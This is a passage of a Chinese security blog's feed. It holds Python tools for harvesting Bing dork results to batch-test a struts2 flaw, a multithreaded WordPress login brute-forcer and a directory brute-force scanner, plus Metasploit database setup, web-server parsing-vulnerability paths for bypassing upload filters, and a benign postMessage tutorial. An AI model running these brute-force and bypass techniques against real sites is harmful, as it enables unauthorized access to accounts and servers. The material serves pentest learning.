<span class="comment">#inurl search string</span></span><br><span class="line">        self.page = page <span class="comment"># page count</span></span><br><span class="line">        self.file = <span class="keyword">None</span> <span class="comment"># save file</span></span><br><span class="line">        <span class="keyword">if</span> file:</span><br><span class="line">            self.file = open(file,<span class="string">'a'</span>)</span><br><span class="line">        self.url = <span class="string">'http://cn.bing.com/search?q='</span> + q</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(self, pageNo)</span>:</span></span><br><span class="line">        res = requests.get(<span class="string">'%s&amp;first=%d'</span> % (self.url, pageNo*<span class="number">10</span>+<span class="number">1</span>))</span><br><span class="line">        pageNo = pageNo + <span class="number">1</span>    </span><br><span class="line">        p = pq(res.content) <span class="comment">#use pyquery to resolve every page content</span></span><br><span class="line">        cite = p.find(<span class="string">'cite'</span>) <span class="comment">#find all urls</span></span><br><span class="line">        mutex.acquire(<span class="number">1</span>)</span><br><span class="line">        print(<span class="string">'pageNo:'</span> + str(pageNo))</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> cite:</span><br><span class="line">            text = pq(n).text().replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">            <span class="keyword">if</span> self.wd.replace(<span class="string">'inurl:'</span>,<span class="string">''</span>) <span class="keyword">in</span> text: <span class="comment">#check target inurl string exists in result url</span></span><br><span class="line">                <span class="keyword">if</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                    self.file.write(text + <span class="string">'\n'</span>) <span class="comment">#write to file</span></span><br><span class="line">                print(text)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        threads = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(int(self.page)):</span><br><span class="line">            t = threading.Thread(target=self.search, args=[i])</span><br><span class="line">            threads.append(t)</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> threads:</span><br><span class="line">            n.start()</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> threads:</span><br><span class="line">            n.join()</span><br><span class="line">        <span class="keyword">if</span> self.file <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            self.file.close()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'This program is to print urls in bing search result about inurl syntax search.'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'string'</span>, action=<span class="string">'store'</span>, help=<span class="string">'search string'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-p'</span>, default=<span class="number">1</span>, dest=<span class="string">'page'</span>, action=<span class="string">'store'</span>, help=<span class="string">'page count'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-o'</span>, dest=<span class="string">'file'</span>, action=<span class="string">'store'</span>, help=<span class="string">'output file'</span>, type=str)</span><br><span class="line">    args = vars(parse.parse_args())</span><br><span class="line">    sea = search_bing(args[<span class="string">'string'</span>], args[<span class="string">'page'</span>], args[<span class="string">'file'</span>])</span><br><span class="line">    sea.run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;为了测试某个漏洞，比如struts2漏洞，我们可能会批量抓取搜索引擎结果来测试，这里简单演示用python脚本来爬取这些bing搜索结果的url，其他搜索引擎类似&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cla
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
      <category term="spider" scheme="http://myt0.com/tags/spider/"/>
    
  </entry>
  
  <entry>
    <title>python多线程破解form登录(wordpress)</title>
    <link href="http://myt0.com/2017/06/11/brute-form-with-python/"/>
    <id>http://myt0.com/2017/06/11/brute-form-with-python/</id>
    <published>2017-06-11T10:21:31.000Z</published>
    <updated>2017-06-11T10:38:27.400Z</updated>
    
    <content type="html"><![CDATA[<p>本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》<br>原书使用urllib,urllib2,HTMLParser等库实现，这里我用requests请求，pyquery来解析，更加方便一点。<br>这里只要修改一下前面的几个参数即可使用于其他的web程序，原书本用于破解joomla，这里我们改成了wordpress。<br>书里的代码可以去<a href="https://github.com/coldhurt/pycode" target="_blank" rel="external">python代码仓库</a>查看，这里用到的dir_bruster那个函数也在里面，我会不断更新这个仓库，push一些学到的python代码，欢迎交流。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"><span class="keyword">from</span> dir_bruster <span class="keyword">import</span> build_wordlist</span><br><span class="line"></span><br><span class="line">thread_count = <span class="number">10</span></span><br><span class="line"><span class="comment">#login form url</span></span><br><span class="line">target_url = <span class="string">'http://192.168.99.196/wordpress/wp-login.php'</span></span><br><span class="line"><span class="comment">#login form action url</span></span><br><span class="line">target_post = <span class="string">'http://192.168.99.196/wordpress/wp-login.php'</span></span><br><span class="line">username_field = <span class="string">'log'</span></span><br><span class="line">password_field = <span class="string">'pwd'</span></span><br><span class="line">username = <span class="string">'admin'</span></span><br><span class="line">wordlist = build_wordlist(<span class="string">'./pwd.txt'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruster</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="string">'''</span><br><span class="line">    Brute web form using requests and pyquery</span><br><span class="line">    This example is for wordpress, you can change these global params to brute other web app:)</span><br><span class="line">'''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username, wordlist)</span>:</span></span><br><span class="line">        self.username = username</span><br><span class="line">        self.wordlist = wordlist</span><br><span class="line">        self.found = <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run_brust</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> range(thread_count):</span><br><span class="line">            t = threading.Thread(target=self.brust_form)</span><br><span class="line">            t.start()</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">brust_form</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.wordlist.empty() <span class="keyword">and</span> <span class="keyword">not</span> self.found:</span><br><span class="line">            pwd = self.wordlist.get()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = requests.Session()</span><br><span class="line">                res = s.get(target_url)</span><br><span class="line">                body = self.parse(res.text)</span><br><span class="line">                body[username_field] = self.username</span><br><span class="line">                body[password_field] = pwd</span><br><span class="line"></span><br><span class="line">                print(<span class="string">'Trying %s:%s (%d left)'</span> % (self.username, pwd, self.wordlist.qsize()))</span><br><span class="line">                result = s.post(target_post, data=body)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'密码不正确'</span> <span class="keyword">not</span> <span class="keyword">in</span> result.content:</span><br><span class="line">                    self.found = <span class="keyword">True</span></span><br><span class="line">                    print(<span class="string">'Brute successful by %s:%s'</span> % (self.username, pwd))</span><br><span class="line">            <span class="keyword">except</span> requests.ConnectionError <span class="keyword">as</span> e:</span><br><span class="line">                print(e)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, page)</span>:</span></span><br><span class="line">        <span class="string">'''</span><br><span class="line">            create post body</span><br><span class="line">        '''</span></span><br><span class="line">        par = pq(page)</span><br><span class="line">        inputs = par.find(<span class="string">'input'</span>)</span><br><span class="line">        body = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> inputs:</span><br><span class="line">            <span class="keyword">if</span> n.name <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                body[n.name] = <span class="string">''</span></span><br><span class="line">            <span class="keyword">if</span> n.value <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">                body[n.name] = n.value</span><br><span class="line">        <span class="keyword">return</span> body</span><br><span class="line"></span><br><span class="line">b = Bruster(username, wordlist)</span><br><span class="line">b.run_brust()</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》&lt;br&gt;原书使用urllib,urllib2,HTMLParser等库实现，这里我用requests请求，pyquery来解析，更
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>metasploit配置postgresql</title>
    <link href="http://myt0.com/2017/06/10/metasploit-and-postgresql-config/"/>
    <id>http://myt0.com/2017/06/10/metasploit-and-postgresql-config/</id>
    <published>2017-06-10T01:53:12.000Z</published>
    <updated>2017-06-10T02:23:37.248Z</updated>
    
    <content type="html"><![CDATA[<h2 id="创建用户和数据库"><a href="#创建用户和数据库" class="headerlink" title="创建用户和数据库"></a>创建用户和数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#启动postgresql</span><br><span class="line">systemctl start postgresql.service</span><br><span class="line"></span><br><span class="line">#切换到postgres</span><br><span class="line">sudo su postgres</span><br><span class="line"></span><br><span class="line">#创建user</span><br><span class="line">createuser msf -P</span><br><span class="line"></span><br><span class="line">#创建数据库并指定拥有者</span><br><span class="line">createdb msfdb --owner=msf</span><br></pre></td></tr></table></figure>
<h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_connect　msfuser:msfpassword@localhost/msfdb</span><br></pre></td></tr></table></figure>
<p>或者修改metasploit目录下的database.yml</p>
<h2 id="postgresql一些命令"><a href="#postgresql一些命令" class="headerlink" title="postgresql一些命令"></a>postgresql一些命令</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">psql -l</span><br><span class="line"></span><br><span class="line">#改变数据库owner</span><br><span class="line">psql -c "ALTER DATABASE msf_database OWNER TO msf_user;"</span><br><span class="line"></span><br><span class="line">#为一个数据库用户添加或修改密码</span><br><span class="line">psql -c "ALTER USER msf_user WITH ENCRYPTED PASSWORD 'omgwtfbbq';"</span><br><span class="line"></span><br><span class="line">#连接</span><br><span class="line">psql -U user -d db -h host</span><br><span class="line"></span><br><span class="line">#删除用户</span><br><span class="line">dropuser msf</span><br><span class="line"></span><br><span class="line">#删除数据库</span><br><span class="line">dropdb msf</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;创建用户和数据库&quot;&gt;&lt;a href=&quot;#创建用户和数据库&quot; class=&quot;headerlink&quot; title=&quot;创建用户和数据库&quot;&gt;&lt;/a&gt;创建用户和数据库&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td cl
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="metasploit" scheme="http://myt0.com/tags/metasploit/"/>
    
      <category term="tools" scheme="http://myt0.com/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>python多线程扫描网站路径</title>
    <link href="http://myt0.com/2017/06/04/python%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E8%B7%AF%E5%BE%84/"/>
    <id>http://myt0.com/2017/06/04/python多线程扫描网站路径/</id>
    <published>2017-06-04T14:19:52.000Z</published>
    <updated>2017-06-04T16:18:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">resume = <span class="keyword">None</span></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line">user_agent = <span class="string">'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.96 Safari/537.36'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_wordlist</span><span class="params">(wordlist)</span>:</span></span><br><span class="line">    <span class="string">'''Create Queue of file wordlist</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        wordlist: file path of the wordlist</span><br><span class="line">    '''</span></span><br><span class="line">    fd = open(wordlist, <span class="string">'rb'</span>)</span><br><span class="line">    raw_words = fd.readlines()</span><br><span class="line">    fd.close()</span><br><span class="line"></span><br><span class="line">    found_resume = <span class="keyword">False</span></span><br><span class="line">    words = Queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> raw_words:</span><br><span class="line">        word = word.rstrip()</span><br><span class="line">        <span class="keyword">if</span> resume <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">if</span> found_resume:</span><br><span class="line">                words.put(word)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> word == resume:</span><br><span class="line">                    found_resume = <span class="keyword">True</span></span><br><span class="line">                    print(<span class="string">'Resuming wordlist from : %s'</span> % resume)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            words.put(word)</span><br><span class="line">    <span class="keyword">return</span> words</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir_bruster</span><span class="params">(target, word_queue, extensions=None)</span>:</span></span><br><span class="line">    <span class="string">'''Scan target use wordlist queue and extendsions</span><br><span class="line"></span><br><span class="line">    Args:</span><br><span class="line">        target: target url</span><br><span class="line">        word_queue: a Queue obj created by build_wordlist function</span><br><span class="line">        extensions: some extension, a list or tuple</span><br><span class="line">    '''</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> word_queue.empty():</span><br><span class="line">        path = word_queue.get()</span><br><span class="line">        paths = []</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'.'</span> <span class="keyword">not</span> <span class="keyword">in</span> path:</span><br><span class="line">            paths.append(<span class="string">'/%s/'</span> % path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            paths.append(<span class="string">'/%s'</span> % path)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> extensions:</span><br><span class="line">            <span class="keyword">for</span> ext <span class="keyword">in</span> extensions:</span><br><span class="line">                <span class="keyword">if</span> ext.startswith(<span class="string">'.'</span>):</span><br><span class="line">                    paths.append(<span class="string">'/%s%s'</span> % (path, ext))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    paths.append(<span class="string">'/%s.%s'</span> % (path, ext))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> brust <span class="keyword">in</span> paths:</span><br><span class="line">            url = <span class="string">'%s%s'</span> % (target, urllib.quote(brust)) <span class="comment">#urllib.quote can encode request path to support Chinese or other language</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                headers = &#123;&#125;</span><br><span class="line">                headers[<span class="string">'user-agent'</span>] = user_agent</span><br><span class="line">                r = urllib2.Request(url, headers=headers) <span class="comment"># create request through url and headers</span></span><br><span class="line">                res = urllib2.urlopen(r) <span class="comment">#urlopen send request</span></span><br><span class="line">                <span class="keyword">if</span> len(res.read()) <span class="keyword">and</span> mutex.acquire(<span class="number">1</span>):</span><br><span class="line">                    print(<span class="string">'[%d] =&gt; %s'</span> % (res.code, url))</span><br><span class="line">                    mutex.release()</span><br><span class="line">            <span class="keyword">except</span> urllib2.HTTPError <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">if</span> hasattr(e, <span class="string">'code'</span>) <span class="keyword">and</span> e.code != <span class="number">404</span>:</span><br><span class="line">                    print(<span class="string">'!!! %d =&gt; %s'</span> % (e.code, url))</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'A dir scanner'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'url'</span>, action=<span class="string">'store'</span>, help=<span class="string">'target url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w'</span>, required=<span class="keyword">True</span>, dest=<span class="string">'wordlist'</span>, action=<span class="string">'store'</span>, help=<span class="string">'wordlist path'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-t'</span>, dest=<span class="string">'threads'</span>, action=<span class="string">'store'</span>, help=<span class="string">'thread count'</span>, type=int, default=<span class="number">10</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-e'</span>, dest=<span class="string">'extensions'</span>, action=<span class="string">'store'</span>, help=<span class="string">'extensions, eg: "php,asp"'</span>, default=<span class="string">''</span>)</span><br><span class="line">    args = vars(parse.parse_args())</span><br><span class="line">    <span class="keyword">global</span> target,wordlist,threads,ext</span><br><span class="line">    target, wordlist, threads, ext = args[<span class="string">'url'</span>], args[<span class="string">'wordlist'</span>], args[<span class="string">'threads'</span>], \</span><br><span class="line">    args[<span class="string">'extensions'</span>].split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> target.startswith(<span class="string">"http://"</span>):</span><br><span class="line">        target = <span class="string">'http://%s'</span> % target</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(wordlist):</span><br><span class="line">        word_queue = build_wordlist(wordlist)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(threads):</span><br><span class="line">            t = threading.Thread(target=dir_bruster, args=(target, word_queue, ext))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文代码参考自《Black Hat Python: Python Programming for Hackers and Pentesters》&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutte
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
      <category term="python" scheme="http://myt0.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>解析漏洞</title>
    <link href="http://myt0.com/2017/01/19/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>http://myt0.com/2017/01/19/解析漏洞/</id>
    <published>2017-01-18T16:16:30.000Z</published>
    <updated>2017-06-04T14:03:46.551Z</updated>
    
    <content type="html"><![CDATA[<p>iis6.0:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/1.asp/1.jpg</span><br><span class="line">/1.asp;1.jpg</span><br></pre></td></tr></table></figure></p>
<p>apache:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.php.rar  //从右往左解析至可以解析的格式</span><br></pre></td></tr></table></figure></p>
<p>phpcgi解析漏洞，常见于nginx，由于配置文件中的选项cgi.fi:x_pathinfo在某些版本中默认开启而导致：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.jpg/1.php  //1.php并不存在，而这样的请求却会导致1.jpg按照php解析</span><br></pre></td></tr></table></figure></p>
<p>nginx&lt;8.03空字节代码执行漏洞，Nginx在图片中嵌入PHP代码然后访问/1.jpg%00.php</p>
<p>在windows系统下，文件名以“.”或者空格结尾系统会自动去除.与空格，利用此特性可绕过黑名单验证</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;iis6.0:&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;
    
    </summary>
    
    
      <category term="security" scheme="http://myt0.com/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>通过postMessage在iframe和父窗口之间通信</title>
    <link href="http://myt0.com/2016/05/06/postMessage-and-iframe/"/>
    <id>http://myt0.com/2016/05/06/postMessage-and-iframe/</id>
    <published>2016-05-06T13:32:00.000Z</published>
    <updated>2017-06-04T14:03:46.551Z</updated>
    
    <content type="html"><![CDATA[<p>在HTML5中新增了postMessage方法，postMessage可以实现跨文档消息传输（Cross Document Messaging）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">postMessage(data,origin)</span><br><span class="line"></span><br><span class="line">data：要传的数据</span><br><span class="line">origin： 字符串参数，指明目标窗口的源，协议+主机+端口号。如果为*则是所有的窗口，如果要指定和当前窗口同源的话设置为&quot;/&quot;。</span><br></pre></td></tr></table></figure></p>
<p>子页面传给父页面<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//子页面</span></span><br><span class="line"><span class="built_in">window</span>.parent.postMessage(data,<span class="string">'*'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//父页面</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></p>
<p>父页面传给子页面</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//父页面</span></span><br><span class="line"><span class="built_in">window</span>.frames[<span class="number">0</span>].postMessage(data,<span class="string">'http://test.com:port'</span>);<span class="comment">//第二个参数为子页面地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//子页面</span></span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.source != <span class="built_in">window</span>.parent) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">console</span>.log(e.data);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在HTML5中新增了postMessage方法，postMessage可以实现跨文档消息传输（Cross Document Messaging）&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;
    
    </summary>
    
    
      <category term="javascript" scheme="http://myt0.com/tags/javascript/"/>
    
  </entry>
  
</feed>
